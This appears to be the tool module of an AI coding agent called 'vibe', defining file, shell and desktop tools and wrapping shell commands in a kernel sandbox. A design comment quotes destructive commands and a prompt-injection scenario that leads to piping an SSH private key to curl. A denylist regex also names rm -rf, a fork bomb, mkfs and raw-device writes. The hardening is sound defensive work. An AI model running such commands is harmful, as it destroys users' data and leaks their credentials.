import os
import shlex
import subprocess
import re
from pathlib import Path

from vibe import desktop


# ── Tool definitions (OpenAI function-calling schema) ──────────────────────────

TOOL_SCHEMAS = [
    {
        "type": "function",
        "function": {
            "name": "read_file",
            "description": "Read the full contents of a file. Always read a file before editing it.",
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Path to the file to read"},
                },
                "required": ["path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "write_file",
            "description": "Write (overwrite) a file with new content. Use for creating new files or full rewrites.",
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Path to write"},
                    "content": {"type": "string", "description": "Full file content"},
                },
                "required": ["path", "content"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "edit_file",
            "description": "Replace an exact string in a file. old_string must be unique in the file. Prefer this over write_file for targeted edits.",
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Path to the file"},
                    "old_string": {"type": "string", "description": "Exact text to find and replace"},
                    "new_string": {"type": "string", "description": "Replacement text"},
                },
                "required": ["path", "old_string", "new_string"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "bash",
            "description": "Run a shell command and return stdout+stderr. Use for tests, builds, installs, git, etc.",
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {"type": "string", "description": "Shell command to execute"},
                    "timeout": {"type": "integer", "description": "Timeout in seconds (default 30)"},
                },
                "required": ["command"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "glob",
            "description": "Find files matching a glob pattern.",
            "parameters": {
                "type": "object",
                "properties": {
                    "pattern": {"type": "string", "description": "Glob pattern, e.g. '**/*.py'"},
                    "path": {"type": "string", "description": "Root directory to search (default: cwd)"},
                },
                "required": ["pattern"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "grep",
            "description": "Search file contents for a regex pattern. Returns matching lines with file and line number.",
            "parameters": {
                "type": "object",
                "properties": {
                    "pattern": {"type": "string", "description": "Regex pattern to search for"},
                    "path": {"type": "string", "description": "Directory or file to search (default: cwd)"},
                    "file_glob": {"type": "string", "description": "Only search files matching this glob, e.g. '*.py'"},
                },
                "required": ["pattern"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "list_dir",
            "description": "List files and directories at a path.",
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Directory to list (default: cwd)"},
                },
                "required": [],
            },
        },
    },
    # ── The desktop ─────────────────────────────────────────────────────────
    #
    # ⚠ DESCRIBED BY WHAT THEY COST, not only by what they do. The model reads
    # these descriptions and nothing else, so "asks first" belongs in the text:
    # it is what stops the assistant announcing a change it has not made yet.
    {
        "type": "function",
        "function": {
            "name": "desktop_open",
            "description": (
                "Open something on this desktop: a web address, a file, a "
                "folder, an installed application by name, one of the user's "
                "own folders by its plain name (downloads, documents, "
                "pictures, music, videos, desktop, home), or one of the "
                "desktop's own panels — the control panel, task manager, "
                "displays, network, bluetooth, wallpaper, theme, widgets, "
                "clipboard history, emoji picker, calculator, start menu or "
                "keyboard shortcuts. Runs immediately; it changes nothing."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "target": {
                        "type": "string",
                        "description": (
                            "What to open — 'downloads', 'control panel', "
                            "'https://example.com', '~/Documents', 'firefox'"
                        ),
                    },
                },
                "required": ["target"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "desktop_action",
            "description": (
                "Run one of the compositor's own actions by name (the same "
                "verbs its keyboard shortcuts use): screenshot, lock, "
                "fullscreen_toggle, float_toggle, ws, movews, close, "
                "night_light, and others. The user is asked before it runs. "
                "Prefer desktop_open for anything that is just opening a panel."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "action": {"type": "string", "description": "The action name"},
                    "arg": {"type": "string", "description": "Its argument, if it takes one"},
                },
                "required": ["action"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "desktop_setting",
            "description": (
                "Change one desktop setting and apply it to the running "
                "session: bar_edge (top/bottom — this is how the bar is "
                "moved), dock_edge (bottom/top/left/right — how the dock is "
                "moved), bar and dock (on/off), bar_shell, theme, wallpaper, "
                "wallpaper_mode, terminal, animation_ms. The user is asked "
                "before it is written."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "key": {"type": "string", "description": "The setting's name"},
                    "value": {"type": "string", "description": "Its new value"},
                },
                "required": ["key", "value"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "move_file",
            "description": (
                "Move or rename a file or folder. Refuses to overwrite an "
                "existing destination. The user is asked before it runs."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "source": {"type": "string", "description": "What to move"},
                    "dest": {"type": "string", "description": "Where to move it"},
                },
                "required": ["source", "dest"],
            },
        },
    },
]


# ── Self-protection: prevent vibe from editing its own source ─────────────────

_VIBE_ROOT = Path(__file__).resolve().parent.parent
_VIBE_SRC = _VIBE_ROOT / "vibe"

# Only protect vibe's own source files, NOT user project files created in the same dir
_PROTECTED_FILES = {
    _VIBE_ROOT / "main.py",
    _VIBE_ROOT / "vibe.sh",
    _VIBE_ROOT / "setup.sh",
    _VIBE_ROOT / "requirements.txt",
    _VIBE_ROOT / "README.md",
}


def _is_protected(path: str) -> bool:
    """Return True if path is one of vibe's own source files."""
    try:
        resolved = Path(path).expanduser().resolve()
        # Exact match on known protected files
        if resolved in _PROTECTED_FILES:
            return True
        # Anything inside the vibe/ package directory
        try:
            resolved.relative_to(_VIBE_SRC)
            return True
        except ValueError:
            return False
    except Exception:
        return False


_PROTECTED_ERROR = (
    "BLOCKED: This file is part of Vibe Code itself. "
    "You must NOT modify your own source code. "
    "Operate only on the user's project files."
)


# ── Tool implementations ────────────────────────────────────────────────────────

_MAX_READ_SIZE = 512 * 1024  # 512KB — refuse to read huge binary files


def read_file(path: str) -> str:
    p = Path(path).expanduser()
    if not p.exists():
        return f"Error: file not found: {path}"
    if not p.is_file():
        return f"Error: not a file: {path}"
    try:
        size = p.stat().st_size
        if size > _MAX_READ_SIZE:
            return f"Error: file too large ({size:,} bytes). Max: {_MAX_READ_SIZE:,} bytes."
        text = p.read_text(encoding="utf-8", errors="replace")
        lines = text.splitlines()
        numbered = "\n".join(f"{i+1:4d}  {line}" for i, line in enumerate(lines))
        return f"<file path={path} lines={len(lines)}>\n{numbered}\n</file>"
    except UnicodeDecodeError:
        return f"Error: {path} appears to be a binary file."
    except Exception as e:
        return f"Error reading {path}: {e}"


_REVIEW_THRESHOLD = 80  # lines — nudge self-review for large files


def write_file(path: str, content: str) -> str:
    if _is_protected(path):
        return _PROTECTED_ERROR
    p = Path(path).expanduser()
    try:
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
        lines = content.count("\n") + 1
        _edit_fail_counts.pop(str(p.resolve()), None)
        _edit_success_counts.pop(str(p.resolve()), None)
        msg = f"Written {lines} lines to {path}"
        if lines >= _REVIEW_THRESHOLD:
            msg += (
                f"\n\nThis is a large file ({lines} lines). "
                f"You MUST now call read_file on {path} to verify the code is correct "
                f"and complete. Check for: missing function bodies, placeholder comments, "
                f"syntax errors, undefined variables, incomplete logic. "
                f"If anything is wrong, rewrite the entire file with write_file."
            )
        return msg
    except Exception as e:
        return f"Error writing {path}: {e}"


_edit_fail_counts: dict[str, int] = {}
_edit_success_counts: dict[str, int] = {}
_EDIT_CHURN_THRESHOLD = 5
_EDIT_FAIL_LIMIT = 3  # after this many fails, refuse edit_file entirely for this file


def edit_file(path: str, old_string: str, new_string: str) -> str:
    if _is_protected(path):
        return _PROTECTED_ERROR
    if old_string == new_string:
        return "Error: old_string and new_string are identical — nothing to change."
    p = Path(path).expanduser()
    if not p.exists():
        return f"Error: file not found: {path}"
    try:
        key = str(p.resolve())
        original = p.read_text(encoding="utf-8", errors="replace")

        # If this file has already failed too many times, refuse outright
        if _edit_fail_counts.get(key, 0) >= _EDIT_FAIL_LIMIT:
            return (
                f"REFUSED: edit_file has failed {_edit_fail_counts[key]} times on {path}. "
                f"You MUST use write_file to rewrite the entire file. "
                f"Do NOT call edit_file on this file again."
            )

        count = original.count(old_string)
        if count == 0:
            _edit_fail_counts[key] = _edit_fail_counts.get(key, 0) + 1
            fails = _edit_fail_counts[key]
            # Show the full file so the model has everything it needs for write_file
            preview = original
            header = (
                f"STOP. edit_file has failed {fails} time(s) on {path}. "
                f"old_string does not exist in the file. "
                f"YOU MUST use write_file NOW — do not call edit_file again on this file. "
                f"Here is the complete current file content to use as the base for write_file:\n\n"
            )
            return header + preview
        if count > 1:
            return f"Error: old_string matches {count} times in {path} — make it more specific."
        updated = original.replace(old_string, new_string, 1)
        p.write_text(updated, encoding="utf-8")
        _edit_fail_counts.pop(key, None)
        _edit_success_counts[key] = _edit_success_counts.get(key, 0) + 1
        n = _edit_success_counts[key]
        msg = f"Replaced 1 occurrence in {path}"
        if n >= _EDIT_CHURN_THRESHOLD:
            msg += (
                f"\n\nNote: you have now made {n} successive edits to this file. "
                f"If you are still building or fixing it, use write_file to rewrite the "
                f"whole file at once — it is faster and less error-prone than many small edits."
            )
        return msg
    except Exception as e:
        return f"Error editing {path}: {e}"


_BASH_MAX_LINES = 100
_tty_blocked: dict[str, float] = {}  # script path → timestamp when blocked
_TTY_BLOCK_TIMEOUT = 300  # 5 min — allow retry after this

_TTY_BLOCK_ERROR = (
    "BLOCKED: This script timed out recently, which means it requires "
    "an interactive terminal (TTY). Running it again will not work. "
    "Do NOT call bash on this script again. "
    "Tell the user the script is complete and they should run it directly in their terminal."
)


def _extract_script_path(command: str) -> str | None:
    """Return the script path if the command is executing a shell script file."""
    m = re.search(r'(?:^|(?:bash|sh|python3?|node|ruby|perl)\s+)(\.?\.?/?\S+\.(?:sh|py|js|rb|pl))', command)
    return m.group(1) if m else None


_ECHO_WRITE_RE = re.compile(
    r'(?:echo|printf)\s+.{10,}\s*>{1,2}\s*\S+'   # echo "..." > file
    r'|cat\s*(?:<<[-\w]*|>)\s*\S'                 # cat <<EOF > file  or  cat > file
    , re.DOTALL
)

_ECHO_WRITE_ERROR = (
    "BLOCKED: Do not use echo/printf/cat to write file content. "
    "Use the write_file tool instead — it handles any file size and never truncates. "
    "Call write_file with the complete file content now."
)


def _bash_targets_protected(command: str) -> bool:
    """Check if a bash command tries to modify vibe's own source files."""
    modify_keywords = ('sed -i', 'mv ', 'cp ', 'rm ', 'chmod ', 'chown ',
                       'truncate ', '> ', '>> ')
    if not any(kw in command for kw in modify_keywords):
        return False
    # Check if any token in the command resolves to a protected file
    tokens = command.split()
    for token in tokens:
        token = token.strip("'\"")
        if not token or token.startswith('-'):
            continue
        try:
            resolved = Path(token).expanduser().resolve()
            if _is_protected(str(resolved)):
                return True
        except Exception:
            continue
    return False


# ── The sandbox ───────────────────────────────────────────────────────────────
#
# Everything below this comment used to be the whole of the protection: a
# regular expression looking for `rm -rf /` and a fork bomb, in front of
# subprocess.run(shell=True) running as the user with the user's full
# authority.
#
# That is not a boundary. A shell has unlimited ways to spell a command, so
# every one of these walks straight through the denylist:
#
#     rm -rf $HOME                  (it wants a literal / or ~)
#     find ~ -delete
#     python -c "import shutil; shutil.rmtree(...)"
#
# and, worse, the denylist says nothing at all about READING. The real risk
# with a model-driven shell is not destruction, it is prompt injection —
# anything the agent reads can carry instructions — followed by
# `cat ~/.ssh/id_ed25519 | curl -X POST ...`, which the old code permitted
# without a murmur.
#
# So the boundary now lives in the kernel. syn-confine applies a Landlock
# ruleset and execs the command; the confinement is inherited across execve and
# cannot be dropped, so it holds no matter what the command string says or how
# many shells deep it goes. The regexes are kept because a refusal a person can
# read beats EACCES from somewhere inside a pipeline — but they are UX now, not
# the security boundary, and nothing should be added to them under the belief
# that they protect anything.
_SYN_CONFINE = "/usr/bin/syn-confine"

_NO_SANDBOX_ERROR = (
    "BLOCKED: the sandbox (syn-confine) is not available, so this command "
    "cannot be run safely. Install it with:  syn-update apply\n"
    "Refusing to run shell commands unconfined."
)

_BAD_WORKSPACE_ERROR = (
    "BLOCKED: vibe is running in {0}, and sandboxing a shell to that directory "
    "would put your whole home directory back inside the sandbox — which is "
    "the thing it exists to prevent.\n"
    "Start vibe from a project directory instead."
)


def _workspace_ok(cwd: str) -> bool:
    """The workspace becomes the one writable place in the sandbox, so it must
    not be $HOME or / — granting either hands back everything the sandbox was
    meant to withhold, including ~/.ssh."""
    resolved = Path(cwd).resolve()
    return resolved != Path.home().resolve() and resolved != Path("/")


def _confine_argv(command: str, allow_net: bool) -> list:
    """The sandbox invocation for one shell command.

    The workspace is the current directory and nothing else: the base profile
    inside syn-confine covers /usr, /etc, /proc and the handful of /dev nodes a
    tool needs, and everything not named is denied. $HOME is deliberately
    absent, which is what puts ~/.ssh, ~/.gnupg and the browser profiles out of
    reach.

    Network is OFF unless VIBE_ALLOW_NET is set. Off is the right default for
    an agent: it is the difference between a model that can damage the working
    tree and one that can post it somewhere. Note that syn-confine's TCP rules
    do not cover UDP, so this is --isolate-net rather than a bare TCP deny when
    the network is meant to be shut."""
    argv = [_SYN_CONFINE, "--rw", os.getcwd(), "--rw", "/tmp"]
    argv += ["--net"] if allow_net else ["--isolate-net"]
    # bash, not sh -c through a shell of syn-confine's choosing: the command
    # was written for bash and the confinement does not care which shell runs
    # it.
    argv += ["--", "bash", "-c", command]
    return argv


# Dangerous commands that should never be run.
#
# ⚠ UX, NOT A SECURITY BOUNDARY — see the block above. These produce a sentence
# the model can act on; syn-confine is what actually stops anything.
_DANGEROUS_RE = re.compile(
    r'rm\s+(-rf?|--recursive)\s+[/~]'     # rm -rf / or ~
    r'|:\(\)\s*\{\s*:\|:\s*&\s*\}\s*;'     # fork bomb
    r'|mkfs\.'                               # format filesystem
    r'|dd\s+.*of=/dev/'                      # dd to device
    r'|>\s*/dev/sd'                           # write to raw device
    , re.DOTALL
)

_DANGEROUS_ERROR = (
    "BLOCKED: This command could cause serious system damage. "
    "Refusing to execute."
)


def bash(command: str, timeout: int = 30) -> str:
    if not command or not command.strip():
        return "Error: empty command."

    if _DANGEROUS_RE.search(command):
        return _DANGEROUS_ERROR

    if _ECHO_WRITE_RE.search(command):
        return _ECHO_WRITE_ERROR

    if _bash_targets_protected(command):
        return _PROTECTED_ERROR

    script = _extract_script_path(command)
    if script and script in _tty_blocked:
        import time
        # Allow retry after timeout period
        if time.monotonic() - _tty_blocked[script] < _TTY_BLOCK_TIMEOUT:
            return _TTY_BLOCK_ERROR
        else:
            del _tty_blocked[script]

    # Cap timeout to prevent indefinite hangs
    timeout = min(max(timeout, 5), 120)

    # FAIL CLOSED. A missing sandbox means no shell, never an unconfined one:
    # silently degrading is how a boundary stops existing while everything
    # downstream goes on believing it is there.
    if not os.access(_SYN_CONFINE, os.X_OK):
        return _NO_SANDBOX_ERROR
    if not _workspace_ok(os.getcwd()):
        return _BAD_WORKSPACE_ERROR.format(os.getcwd())

    allow_net = os.environ.get("VIBE_ALLOW_NET", "") not in ("", "0", "no")

    try:
        result = subprocess.run(
            _confine_argv(command, allow_net),
            shell=False,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        # 78 is syn-confine's "the sandbox could not be built"; the command did
        # not run. Distinct from the command's own failure, and worth saying so
        # rather than handing the model an unexplained error.
        if result.returncode == 78:
            return ("BLOCKED: the sandbox could not be established, so the "
                    "command was not run.\n" + (result.stderr or "").strip())
        output = ""
        if result.stdout:
            output += result.stdout
        if result.stderr:
            # Separate stderr visually so the model can tell them apart
            if output and result.stderr.strip():
                output += "\n[stderr]\n"
            output += result.stderr
        if result.returncode != 0:
            output += f"\n[exit code {result.returncode}]"
        output = output.strip() or "[no output]"

        # Truncate to avoid bloating the context with noisy output
        lines = output.splitlines()
        if len(lines) > _BASH_MAX_LINES:
            # Keep more tail than head — errors are usually at the end
            head = _BASH_MAX_LINES // 3
            tail = _BASH_MAX_LINES - head
            omitted = len(lines) - _BASH_MAX_LINES
            output = (
                "\n".join(lines[:head])
                + f"\n\n... ({omitted} lines omitted) ...\n\n"
                + "\n".join(lines[-tail:])
            )

        # Detect common no-TTY failures for interactive programs
        if any(phrase in output for phrase in (
            "cbreak() returned ERR", "nocbreak() returned ERR",
            "setupterm: could not find terminal", "not a terminal",
        )):
            if script:
                import time
                _tty_blocked[script] = time.monotonic()
            return (
                "Error: this program requires an interactive terminal (TTY) and cannot be "
                "run through the bash tool. Write the code and instruct the user to run it "
                "directly in their terminal instead."
            )

        return output
    except subprocess.TimeoutExpired:
        if script:
            import time
            _tty_blocked[script] = time.monotonic()
        return (
            f"Error: command timed out after {timeout}s. "
            "This means the program requires an interactive terminal (TTY) — "
            "it is waiting for input or running an event/game loop that never exits. "
            "This script is now BLOCKED from running via bash for this session. "
            "Do NOT retry. Do NOT modify the script to add timeouts. "
            "Tell the user the script is ready and they should run it directly in their terminal."
        )
    except Exception as e:
        return f"Error: {e}"


_GLOB_MAX = 200


def glob(pattern: str, path: str | None = None) -> str:
    root = Path(path).expanduser() if path else Path.cwd()
    if not root.is_dir():
        return f"Error: not a directory: {path}"
    try:
        matches = sorted(root.glob(pattern))
        if not matches:
            return "No files matched."
        lines = [str(m.relative_to(root)) for m in matches[:_GLOB_MAX]]
        if len(matches) > _GLOB_MAX:
            lines.append(f"... (+{len(matches) - _GLOB_MAX} more files, narrow your pattern)")
        return "\n".join(lines)
    except Exception as e:
        return f"Error: {e}"


_GREP_MAX = 500


def grep(pattern: str, path: str | None = None, file_glob: str | None = None) -> str:
    root = Path(path).expanduser() if path else Path.cwd()
    try:
        compiled = re.compile(pattern)
    except re.error as e:
        return f"Invalid regex: {e}"

    results = []
    skipped = 0
    file_iter = root.rglob(file_glob) if file_glob else root.rglob("*")

    for fp in file_iter:
        if not fp.is_file():
            continue
        try:
            text = fp.read_text(encoding="utf-8", errors="replace")
            for i, line in enumerate(text.splitlines(), 1):
                if compiled.search(line):
                    rel = fp.relative_to(root)
                    results.append(f"{rel}:{i}: {line.rstrip()}")
        except (PermissionError, OSError):
            skipped += 1
            continue
        if len(results) >= _GREP_MAX:
            results.append(f"... (truncated at {_GREP_MAX} results)")
            break

    out = "\n".join(results) if results else "No matches found."
    if skipped:
        out += f"\n[{skipped} file(s) skipped due to read errors]"
    return out


def list_dir(path: str | None = None) -> str:
    p = Path(path).expanduser() if path else Path.cwd()
    if not p.exists():
        return f"Error: path not found: {path}"
    if not p.is_dir():
        return f"Error: not a directory: {path}"
    try:
        entries = sorted(p.iterdir(), key=lambda x: (x.is_file(), x.name))
        lines = []
        for e in entries:
            try:
                if e.is_dir():
                    lines.append(f"  {e.name}/")
                else:
                    size = e.stat().st_size
                    lines.append(f"  {e.name}  ({size:,} bytes)")
            except OSError:
                lines.append(f"  {e.name}  [unreadable]")
        return "\n".join(lines) or "(empty directory)"
    except PermissionError:
        return f"Error: permission denied: {path}"
    except Exception as e:
        return f"Error: {e}"


# ── Dispatch ───────────────────────────────────────────────────────────────────

TOOL_MAP = {
    "read_file": lambda args: read_file(**args),
    "write_file": lambda args: write_file(**args),
    "edit_file": lambda args: edit_file(**args),
    "bash": lambda args: bash(**args),
    "glob": lambda args: glob(**args),
    "grep": lambda args: grep(**args),
    "list_dir": lambda args: list_dir(**args),
    "desktop_open": lambda args: desktop.desktop_open(**args),
    "desktop_action": lambda args: desktop.desktop_action(**args),
    "desktop_setting": lambda args: desktop.desktop_setting(**args),
    "move_file": lambda args: desktop.move_file(**args),
}


def execute_tool(name: str, args: dict) -> str:
    fn = TOOL_MAP.get(name)
    if fn is None:
        return f"Error: unknown tool '{name}'. Available: {', '.join(TOOL_MAP)}"
    try:
        return fn(args)
    except TypeError as e:
        return f"Error: bad arguments for {name}: {e}. Expected: {list(args.keys()) if args else 'none'}"
    except Exception as e:
        return f"Error executing {name}: {e}"
